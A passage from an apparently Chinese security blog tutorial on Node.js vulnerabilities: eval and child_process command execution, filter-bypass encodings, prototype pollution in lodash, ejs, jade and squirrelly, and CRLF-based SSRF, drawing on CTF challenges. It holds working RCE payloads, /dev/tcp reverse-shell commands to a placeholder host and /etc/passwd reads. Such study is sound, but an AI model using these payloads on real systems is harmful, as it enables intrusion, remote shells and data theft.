src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1667810117885-97fe09ad-6c49-4819-8356-cf5c04b9446c.png" alt="2f6f612f38094b2ab52b16106b4cdaff.png"></p><h2 id="ES6模板字符串"><a href="#ES6模板字符串" class="headerlink" title="ES6模板字符串"></a>ES6模板字符串</h2><p>我们可以使用反引号替代括号执行函数，可以用反引号替代单引号双引号，可以在反引号内插入变量。<br>但是有一点我们需要注意，模板字符串是将字符串作为参数传入函数中，而参数是一个数组，所以数组遇到${}时，字符串会被分割。</p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log(&quot;hello %s&quot;,yake);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783362313-8f198fb4-93cd-4572-8a3e-a256390cb13e.png" alt="image.png"></p><pre><code class="plsql">var yake = &quot;sakura&quot;;console.log`hello$&#123;yake&#125;world`;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668783434923-1fa642fb-e307-494e-8fbb-625f8f325521.png" alt="image.png"></p><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><h3 id="16进制编码"><a href="#16进制编码" class="headerlink" title="16进制编码"></a>16进制编码</h3><pre><code class="plsql">console.log(&quot;a&quot;===&quot;\x61&quot;); // true</code></pre><h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><pre><code class="plsql">console.log(&quot;\u0061&quot;===&quot;a&quot;); // true</code></pre><h3 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h3><pre><code class="plsql">eval(Buffer.from(&#39;Y29uc29sZS5sb2coImhhaGFoYWhhIik7&#39;,&#39;base64&#39;).toString())</code></pre><h1 id="Nodejs危险函数的利用"><a href="#Nodejs危险函数的利用" class="headerlink" title="Nodejs危险函数的利用"></a>Nodejs危险函数的利用</h1><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p> javascript 的 eval 作用就是计算某个字符串，并执行其中的 js 代码。  </p><pre><code class="plsql">console.log(eval(&quot;document.cookie&quot;)); //执行document.cookieconsole.log(&quot;document.cookie&quot;); //输出document.cookie</code></pre><p><strong>我们来搭建一个服务测试一下</strong></p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();app.get(&#39;/&#39;,function(req,res)&#123;    res.send(eval(req.query.a));console.log(req.query.a);&#125;)app.listen(1234);console.log(&#39;Server runing at http://127.0.0.1:1234/&#39;);</code></pre><p> Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令<br><strong>1.exec()</strong><br> 启动一个子进程来执行命令，与spawn()不同的是其接口不同，它有一个回调函数获知子进程的状况。实际使用可以不加回调函数。  </p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;calc&#39;);</code></pre><pre><code class="plsql">http://127.0.0.1:1234/?a=require(&#39;child_process&#39;).exec(&#39;ping 8ogywq.dnslog.cn&#39;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784913491-37d4aa9c-2ac5-4002-907b-85b127ba50f2.png" alt="image.png"><br>我们可以看到成功执行了命令<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668784938711-2a5fe36d-fc0c-4e43-8237-6446a8cc5fa9.png" alt="image.png"><br><strong>我们可以进行反弹shell的操作:</strong></p><pre><code class="plsql">require(&#39;child_process&#39;).exec(&#39;echo SHELL_BASE_64|base64 -d|bash&#39;);注意：BASE64加密后的字符中有一个+号需要url编码为%2B(一定情况下)</code></pre><p>PS：如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，<br>则可以使用global.process.mainModule.constructor._load(‘child_process’).exec(‘calc’)来执行命令</p><p><strong>2.spawn()</strong><br> 启动一个子进程来执行命令。spawn (命令，{shell:true})。需要开启命令执行的指令。  </p><pre><code class="plsql">require(&#39;child_process&#39;).spawn(&#39;whoami&#39;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668785909690-1fbe2c21-44f1-46e5-b078-762a11e53787.png" alt="image.png"><br><strong>3.fork()</strong><br> 与spawn()类似，不同点在于它创建Node的子进程只需指定要执行的JavaScript文件模块即可。用于执行 js 文件，实际利用中需要提前写入恶意文件  </p><pre><code class="plsql">require(&#39;child_process&#39;).fork(&#39;C:\\Users\\Sakura\\Desktop\\evil.js&#39;);</code></pre><p>此时是假设我们已经上传了evil.js文化,我们就可以用fork去执行<br>如我们在evil.js中代码如下:</p><pre><code class="plsql">console.log(&quot;hello hacker&quot;);</code></pre><p>我们此时访问这个网站</p><pre><code class="plsql">http://127.0.0.1:1234/?a=require(%27child_process%27).fork(%27C:\\Users\\Sakura\\Desktop\\evil.js%27);</code></pre><p>如图，命令被成功执行了<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668788483287-4013c99b-b180-45fe-99cc-a06226ef1751.png" alt="image.png"><br><strong>4.execFile()</strong><br> 启动一个子进程来执行可执行文件。实际利用时，在第一个参数位置执行 shell 命令，类似 exec。  </p><pre><code class="plsql">require(&#39;child_process&#39;).execFile(&quot;calc&quot;,&#123;shell:true&#125;);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668789182418-b79fe64a-ed03-4594-abe0-0ad2e03fa454.png" alt="image.png"><br><strong>注意点:</strong></p><ol><li>**<em>spawn()与exec()、execFile()不同的是，后两者创建时可以指定timeout属性</em>**，设置超时时间， 一旦创建的进程运行超过设定的时间将会被杀死。</li><li>exec()与execFile()不同的是，**<em>exec()适合执行已有的命令，execFile()适合执行文件</em>**。</li></ol><p><strong>后面几个函数的利用方法也是调用上述介绍的四种方法,这里就不再赘述!</strong></p><h3 id="settimeout"><a href="#settimeout" class="headerlink" title="settimeout()"></a>settimeout()</h3><p> settimeout(function,time)，该函数作用是两秒后执行函数，function 处为我们可控的参数。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setTimeout(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="setinterval"><a href="#setinterval" class="headerlink" title="setinterval()"></a>setinterval()</h3><p> setinterval (function,time)，该函数的作用是每个两秒执行一次代码。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();setInterval(()=&gt;&#123;  console.log(&quot;console.log(&#39;Hacked&#39;)&quot;);&#125;,2000);var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h3 id="function"><a href="#function" class="headerlink" title="function()"></a>function()</h3><p> function(string)()，string 是传入的参数，这里的 function 用法类似于 php 里的 create_function。  </p><pre><code class="plsql">var express = require(&quot;express&quot;);var app = express();var aaa=Function(&quot;console.log(&#39;Hacked&#39;)&quot;)();var server = app.listen(1234,function()&#123;    console.log(&quot;应用实例，访问地址为 http://127.0.0.1:1234/&quot;);&#125;)</code></pre><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><p>既然我们可以执行函数，那自然可以进行文件的增删改查。<br>操作函数后面有Sync代表同步方法</p><blockquote><p>Node.js 文件系统（fs 模块）模块中的方法均有异步和同步版本，例如读取文件内容的函数有异步的 fs.readFile() 和同步的 fs.readFileSync()。<br>异步的方法函数最后一个参数为回调函数，回调函数的第一个参数包含了错误信息(error)。<br>建议大家使用异步方法，比起同步，异步方法性能更高，速度更快，而且没有阻塞。</p></blockquote><p><strong>读</strong><br>readFile()</p><pre><code class="plsql">require(&#39;fs&#39;).readFile(&#39;/etc/passwd&#39;, &#39;utf-8&#39;, (err, data) =&gt; &#123; if (err) throw err; console.log(data);&#125;);</code></pre><p> readFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).readFileSync(&#39;/etc/passwd&#39;,&#39;utf-8&#39;)</code></pre><p>readdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).readdirSync(&#39;.&#39;).toString()</code></pre><p>rmdirSync</p><pre><code class="plsql">require(&#39;fs&#39;).rmdirSync(&#39;./daigua&#39;).toString()</code></pre><p><strong>写</strong><br> writeFileSync()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFileSync(&#39;input.txt&#39;,&#39;sss&#39;);</code></pre><p> writeFile()</p><pre><code class="plsql">require(&#39;fs&#39;).writeFile(&#39;input.txt&#39;,&#39;test&#39;,(err)=&gt;&#123;&#125;)</code></pre><h2 id="nodejs危险函数-RCE-bypass"><a href="#nodejs危险函数-RCE-bypass" class="headerlink" title="nodejs危险函数-RCE bypass"></a>nodejs危险函数-RCE bypass</h2><p> 原型:</p><pre><code class="plsql">require(&quot;child_process&quot;).execSync(&#39;cat flag.txt&#39;)</code></pre><h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&#39;exe&#39;%2b&#39;cSync&#39;](&#39;cat flag.txt&#39;)//(%2b就是+的url编码) require(&#39;child_process&#39;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;open /System/Applications/Calculator.app/&quot;)</code></pre><h3 id="编码绕过-1"><a href="#编码绕过-1" class="headerlink" title="编码绕过"></a>编码绕过</h3><pre><code class="plsql">require(&quot;child_process&quot;)[&quot;\x65\x78\x65\x63\x53\x79\x6e\x63&quot;](&#39;cat flag.txt&#39;)require(&quot;child_process&quot;)[&quot;\u0065\u0078\u0065\u0063\u0053\x79\x6e\x63&quot;](&#39;cat fl001g.txt&#39;)eval(Buffer.from(&#39;cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCdvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwLycpOw==&#39;,&#39;base64&#39;).toString()) //弹计算器</code></pre><h3 id="模板拼接"><a href="#模板拼接" class="headerlink" title="模板拼接"></a>模板拼接</h3><pre><code class="plsql">require(&quot;child_process&quot;)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](&#39;open /System/Applications/Calculator.app/&#39;）</code></pre><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><pre><code class="plsql">require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;); require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); *//调用某个可执行文件，在第二个参数传args* require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).spawnSync(&#39;sleep&#39;, [&#39;3&#39;]); require(&quot;child_process&quot;).execFileSync(&#39;sleep&#39;, [&#39;3&#39;]);</code></pre><h1 id="nodejs-原型链污染"><a href="#nodejs-原型链污染" class="headerlink" title="nodejs-原型链污染"></a>nodejs-原型链污染</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>我们首先要知道这几点:<br> 1.在javascript，每一个实例对象都有一个prototype属性，prototype 属性可以向对象添加属性和方法。  </p><pre><code class="plsql">object.prototype.name=value</code></pre><p> 2.在javascript，每一个实例对象都有一个__proto__属性，这个实例属性指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对象的原型对象：  </p><pre><code class="html">objectname[&quot;__proto__&quot;]objectname.__proto__objectname.constructor.prototype</code></pre><p> 3.不同对象所生成的原型链如下(部分)：  </p><pre><code class="html">var o = &#123;a: 1&#125;;// o对象直接继承了Object.prototype// 原型链：// o ---&gt; Object.prototype ---&gt; nullvar a = [&quot;yo&quot;, &quot;whadup&quot;, &quot;?&quot;];// 数组都继承于 Array.prototype// 原型链：// a ---&gt; Array.prototype ---&gt; Object.prototype ---&gt; nullfunction f()&#123;return 2;&#125;// 函数都继承于 Function.prototype// 原型链：// f ---&gt; Function.prototype ---&gt; Object.prototype ---&gt; null</code></pre><p>知道了以上三点以后，我们来介绍如何进行原型链污染</p><p> 对于语句：object[a][b] = value 如果可以控制a、b、value的值，将a设置为__proto__，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。<br> 来看一个简单的例子:  </p><pre><code class="html">object1 = &#123;&quot;a&quot;:1, &quot;b&quot;:2&#125;;object1.__proto__.foo = &quot;Hello World&quot;;console.log(object1.foo);object2 = &#123;&quot;c&quot;:1, &quot;d&quot;:2&#125;;console.log(object2.foo);</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668790669590-6b7771d7-3023-46f0-bb45-2ddec0c9e219.png" alt="image.png"><br>最终输出了两个hello word<br>为什么object2在没有设置foo属性的情况下，也会输出Hello World呢？就是因为在第二条语句中，我们对object1的原型对象设置了一个foo属性，而object2和object1一样，都是继承了Object.prototype。在获取object2.foo时，由于object2本身不存在foo属性，就会往父类Object.prototype中去寻找。这就造成了 一个原型链污染，所以原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。</p><h2 id="merge操作导致原型链污染"><a href="#merge操作导致原型链污染" class="headerlink" title="merge操作导致原型链污染"></a>merge操作导致原型链污染</h2><p>merge操作是最常见可能控制键名的操作，也最能被原型链攻击。<br>例子:</p><pre><code class="javascript">function merge(target, source) &#123;for (let key in source) &#123;    if (key in source &amp;&amp; key in target) &#123;        merge(target[key], source[key])    &#125; else &#123;        target[key] = source[key]        &#125;    &#125;&#125;let object1 = &#123;&#125;let object2 = JSON.parse(&#39;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#39;)merge(object1, object2)console.log(object1.a, object1.b)object3 = &#123;&#125;console.log(object3.b)# merge() 函数用于合并两个数组内容到第一个数组。在本段代码的作用就是将待操作的对象merge到一个空对象中</code></pre><p>需要注意的点是：<br>在JSON解析的情况下，__proto__会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历object2的时候会存在这个键。<br>我们来看下，有和没有JSON解析的区别</p><pre><code class="javascript">&lt;script&gt;          let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;        console.log(o2)      let object2=JSON.parse(&#39;&#123;&quot;a&quot;:1,&quot;__proto__&quot;:&#123;&quot;b&quot;:2&#125;&#125;&#39;)      console.log(object2)  &lt;/script&gt;</code></pre><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668836886258-58f08cf3-4739-40b1-ade0-6f1a54f8dc7f.png" alt="image-20220416001143881.png"><br> 所以代码在执行过程中会存在这么一步  </p><pre><code class="javascript">target[__proto__]=source[__proto__]可理解为  object.prototype = &#123;&quot;b&quot;: 2&#125; 导致了原型链污染</code></pre><p> 最终输出的结果为：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668839912381-24bdf37b-f5df-41ea-a963-e5c31549da5d.png" alt="image.png"><br> 可见object3的b是从原型中获取到的，说明Object已经被污染了。  </p><h2 id="lodash"><a href="#lodash" class="headerlink" title="lodash"></a>lodash</h2><blockquote><p> lodash是为了弥补JavaScript原生函数功能不足而提供的一个辅助功能集，其中包含字符串、数组、对象等操作。这个Web应用中，使用了lodash提供的两个工具：  </p><ol><li>lodash.template 一个简单的模板引擎</li><li>lodash.merge 函数或对象的合并</li></ol><p> 其实整个应用逻辑很简单，用户提交的信息，用merge方法合并到session里，多次提交，session里最终保存你提交的所有信息。</p></blockquote><p>以<a href="https://github.com/phith0n/code-breaking/blob/master/2018/thejs/web/server.js">Code-Breaking 2018 Thejs</a>为例说明分析过程:<br> 题目源码下载：<a href="http://code-breaking.com/puzzle/9/">http://code-breaking.com/puzzle/9/</a></p><pre><code class="javascript">const fs = require(&#39;fs&#39;)const express = require(&#39;express&#39;)const bodyParser = require(&#39;body-parser&#39;)const lodash = require(&#39;lodash&#39;)const session = require(&#39;express-session&#39;)const randomize = require(&#39;randomatic&#39;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&#39;/static&#39;, express.static(&#39;static&#39;))app.use(session(&#123;    name: &#39;thejs.session&#39;,    secret: randomize(&#39;aA0&#39;, 16),    resave: false,    saveUninitialized: false&#125;))app.engine(&#39;ejs&#39;, function (filePath, options, callback) &#123; // define the template engine    fs.readFile(filePath, (err, content) =&gt; &#123;        if (err) return callback(new Error(err))        let compiled = lodash.template(content)        let rendered = compiled(&#123;...options&#125;)        return callback(null, rendered)    &#125;)&#125;)app.set(&#39;views&#39;, &#39;./views&#39;)app.set(&#39;view engine&#39;, &#39;ejs&#39;)app.all(&#39;/&#39;, (req, res) =&gt; &#123;    let data = req.session.data || &#123;language: [], category: []&#125;    if (req.method == &#39;POST&#39;) &#123;        data = lodash.merge(data, req.body)        req.session.data = data    &#125;        res.render(&#39;index&#39;, &#123;        language: data.language,         category: data.category    &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`))</code></pre><p> 问题出在lodash.merge()函数,这个函数存在原型链污染漏洞。我们得寻找到可以利用的点。因为通过漏洞可以控制某一种实例对象原型的属性，所以我们需要去寻找一个可以被利用的属性。<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840471628-b5711487-8536-4a31-b5b4-c779de7628db.png" alt="image-20220416004841823.png"><br> 页面最终会通过lodash.template进行渲染<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840499521-d6d64285-7a69-4e69-b6fb-a8221e5ff74f.png" alt="image-20220416005502144.png"><br> 跟踪到lodash/template.js中<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840571097-a32cb4ca-8bf1-44a2-b1ff-940d5d715282.png" alt="QyN5JVOde3YL8aZ.png"><br>如图可以看到options是一个对象，sourceURL是通过下面的语句赋值的，options默认没有sourceURL属性，所以sourceURL默认也是为空。如果我们能够给options的原型对象加一个sourceURL属性，那么我们就可以控制sourceURL的值。<br>继续往下面看，最后sourceURL传递到了Function函数的第二个参数当中：<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668840627165-a79efcc5-3819-4e3f-8a7d-a2accd1ef055.png" alt="pwoVFrOyfzJX42M.png"><br>通过构造chile_process.exec()就可以执行任意代码了。<br>最终可以构造一个简单的Payload作为传递给主页面的的POST数据(windows调用计算器)：</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nglobal.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)//&quot;&#125;&#125;</code></pre><p>(这里直接用require会报错：ReferenceError: require is not defined<br>p神给了一个更好的payload：</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;\nreturn e=&gt; &#123;for (var a in &#123;&#125;) &#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;id&#39;)&#125;\n//&quot;&#125;&#125;</code></pre><h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><blockquote><p>主要为两个函数的伪造。<br>opts.outputFunctionName<br>opts.escapeFunction</p></blockquote><p><strong>例一</strong><br> test.js  </p><pre><code class="javascript">var express = require(&#39;express&#39;);var _= require(&#39;lodash&#39;);var ejs = require(&#39;ejs&#39;);var app = express();//设置模板的位置app.set(&#39;views&#39;, __dirname);//对原型进行污染var malicious_payload = &#39;&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;&#39;;_.merge(&#123;&#125;, JSON.parse(malicious_payload));//进行渲染app.get(&#39;/&#39;, function (req, res) &#123;    res.render (&quot;./test.ejs&quot;,&#123;        message: &#39;lufei test &#39;    &#125;);&#125;);//设置httpvar server = app.listen(8081, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;应用实例，访问地址为 http://%s:%s&quot;, host, port)&#125;);</code></pre><p> test.ejs  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;&lt;%= message%&gt;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload：  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(\&#39;child_process\&#39;).exec(\&#39;calc\&#39;);var __tmp2&quot;&#125;&#125;</code></pre><p><strong>例二</strong></p><pre><code class="javascript">router.post(&#39;/&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;  res.type(&#39;html&#39;);  var user = new function()&#123;    this.userinfo = new function()&#123;    this.isVIP = false;    this.isAdmin = false;        &#125;;  &#125;;  utils.copy(user.userinfo,req.body);  if(user.userinfo.isAdmin)&#123;    return res.json(&#123;ret_code: 0, ret_msg: &#39;login success!&#39;&#125;);    &#125;else&#123;    return res.json(&#123;ret_code: 2, ret_msg: &#39;login fail!&#39;&#125;);    &#125;&#125;);</code></pre><p>**<em>payload1</em>**：覆盖 opts.outputFunctionName , 这样构造的payload就会被拼接进js语句中，并在 ejs 渲染时进行 RCE。  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a=1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); //&quot;&#125;&#125;&#125;&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;__tmp1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;); __tmp2&quot;&#125;&#125;&#125;</code></pre><p>**<em>payload2</em>**：伪造 opts.escapeFunction 也可以进行 RCE  </p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;client&quot;:true,&quot;escapeFunction&quot;:&quot;1; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);&quot;&#125;&#125;&#125;</code></pre><p><strong>补充:</strong> 在 ejs 模板中还有三个可控的参数, 分别为 opts.localsName 和 opts.destructuredLocals 和 opts.filename, 但是这三个无法构建出合适的污染链。  </p><h2 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h2><p>compileDebug的伪造<br>给出上面题目的payload，可参考着看。</p><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;self&quot;:1,&quot;line&quot;:&quot;console.log(global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/1234 0&gt;&amp;1\&quot;&#39;))&quot;&#125;&#125;</code></pre><pre><code class="javascript">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;type&quot;:&quot;Code&quot;,&quot;compileDebug&quot;:true,&quot;self&quot;:true,&quot;line&quot;:&quot;0, \&quot;\&quot; ));return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;dir&#39;);//&quot;&#125;&#125;&#125;</code></pre><h2 id="squirrelly"><a href="#squirrelly" class="headerlink" title="squirrelly"></a>squirrelly</h2><p><strong><em>CVE-2021-32819</em></strong><br>server.js</p><pre><code class="javascript">const express = require(&#39;express&#39;)const squirrelly = require(&#39;squirrelly&#39;)const app = express()app.set(&#39;views&#39;, __dirname);app.set(&#39;view engine&#39;, &#39;squirrelly&#39;)app.use(express.urlencoded(&#123; extended: false &#125;));app.get(&#39;/&#39;, (req, res) =&gt; &#123;   res.render(&#39;index.squirrelly&#39;, req.query)&#125;)var server = app.listen(3000, &#39;0.0.0.0&#39;, function () &#123;    var host = server.address().address    var port = server.address().port    console.log(&quot;Listening on http://%s:%s&quot;, host, port)&#125;);</code></pre><p> index.squirrelly  </p><pre><code class="javascript">&lt;!DOCTYPE html&gt;&lt;html&gt;    &lt;head&gt;        &lt;title&gt;CVE-2021-32819&lt;/title&gt;        &lt;h1&gt;Test For CVE-2021-32819&lt;/h1&gt;    &lt;/head&gt;&lt;body&gt;    &lt;h1&gt;&#123;&#123;it.variable&#125;&#125;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p> payload  </p><pre><code class="javascript">/?defaultFilter=e&#39;)); let require = global.require || global.process.mainModule.constructor._load; require(&#39;child_process&#39;).exec(&#39;dir&#39;); //</code></pre><p>PS:以下贴出几篇文章，师傅们可以跟进分析：<br><a href="https://www.aisoutu.com/a/1373814">https://www.aisoutu.com/a/1373814</a><br><a href="https://cloud.tencent.com/developer/article/2035888">https://cloud.tencent.com/developer/article/2035888</a><br><a href="https://www.freebuf.com/vuls/276112.html">https://www.freebuf.com/vuls/276112.html</a><br><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">几个node模板引擎的原型链污染分析</a></p><h1 id="nodejs中的ssrf"><a href="#nodejs中的ssrf" class="headerlink" title="nodejs中的ssrf"></a>nodejs中的ssrf</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>**虽然用户发出的http请求通常将请求路径指定为字符串，但Node.js最终必须将请求作为原始字节输出。JavaScript支持unicode字符串，因此将它们转换为字节意味着选择并应用适当的unicode编码。对于不包含主体的请求，Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符。相反，这些字符被截断为其JavaScript表示的最低字节  **</p><pre><code class="plsql">&gt; v = &quot;/caf\u&#123;E9&#125;\u&#123;01F436&#125;&quot;&#39;/café🐶&#39;&gt; Buffer.from(v,&#39;latin1&#39;).toString(&#39;latin1&#39;)&#39;/café=6&#39;</code></pre><p><strong>Crlf HTTP头注入:</strong><br> 假设一个服务器，接受用户输入，并将其包含在通过HTTP公开的内部服务请求中，像这样：  </p><pre><code class="plsql">GET /private-api?q=&lt;user-input-here&gt; HTTP/1.1Authorization: server-secret-key</code></pre><p> 如果服务器未正确验证用户输入，则攻击者可能会直接注入协议控制字符到请求里。假设在这种情况下服务器接受了以下用户输入：  </p><pre><code class="plsql">&quot;x HTTP/1.1\r\n\r\nDELETE /private-api HTTP/1.1\r\n&quot;</code></pre><p> 在发出请求时，服务器可能会直接将其写入路径，如下：  </p><pre><code class="plsql">GET /private-api?q=x HTTP/1.1DELETE /private-apiAuthorization: server-secret-key</code></pre><p><strong>说到底就是\r\n成功生效</strong><br>接收服务将此解释为两个单独的HTTP请求，一个GET后跟一个DELETE<br>好的HTTP库通通常包含阻止这一行为的措施，Node.js也不例外：如果你尝试发出一个路径中含有控制字符的HTTP请求，它们会被URL编码：</p><pre><code class="plsql">http.get(&#39;http://example.com/\r\n/test&#39;).output[ &#39;GET /%0D%0A/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> 不幸的是，上述的处理unicode字符错误意味着可以规避这些措施。考虑如下的URL，其中包含一些带变音符号的unicode字符：  </p><pre><code class="plsql">&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;http://example.com/čĊ/test</code></pre><p> 当Node.js版本8或更低版本对此URL发出GET请求时，它不会进行转义，因为它们不是HTTP控制字符：  </p><pre><code class="plsql">http.get(&#39;http://example.com/\u010D\u010A/test&#39;).output[ &#39;GET /čĊ/test HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n&#39; ]</code></pre><p> 但是当结果字符串被编码为latin1写入路径时，这些字符将分别被截断为“\r”和“\n”：  </p><pre><code class="plsql">Buffer.from(&#39;http://example.com/\u&#123;010D&#125;\u&#123;010A&#125;/test&#39;, &#39;latin1&#39;).toString()&#39;http://example.com/\r\n/test&#39;</code></pre><p>Node.js默认使用“latin1”，这是一种单字节编码，不能表示高编号的unicode字符<br>说白了，上面这段的意思就是我们可以利用一些特殊字符，它们在URL请求时不会被转义处理，但是当它到了js引擎时，由于其默认用的是latin1，因此可以将我们用的特殊字符转义得到我们需要的字符，从而达到ssrf的目的</p><h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><strong>source：</strong></p><pre><code class="plsql">var express = require(&#39;express&#39;); var app = express(); var fs = require(&#39;fs&#39;); var path = 